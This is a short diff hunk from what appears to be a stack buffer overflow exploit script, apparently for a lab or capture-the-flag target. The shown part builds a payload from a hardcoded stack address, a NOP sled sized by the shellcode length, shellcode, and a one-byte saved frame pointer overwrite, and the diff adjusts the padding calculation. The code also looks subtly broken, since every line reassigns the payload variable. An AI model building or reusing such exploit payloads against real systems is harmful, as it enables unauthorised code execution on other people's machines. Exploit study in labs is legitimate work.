@@ -132,7 +132,7 @@ buffer_addr = 0xbffffc84
 last_sfp = 0x84 - 4
 
 payload = p32(buffer_addr + 4)
-payload = append("\x90"*(40-4-24))
+payload = append("\x90"*(40-4-len(shellcode)))
 payload = append(shellcode)
 payload = append(p8(last_sfp))
 
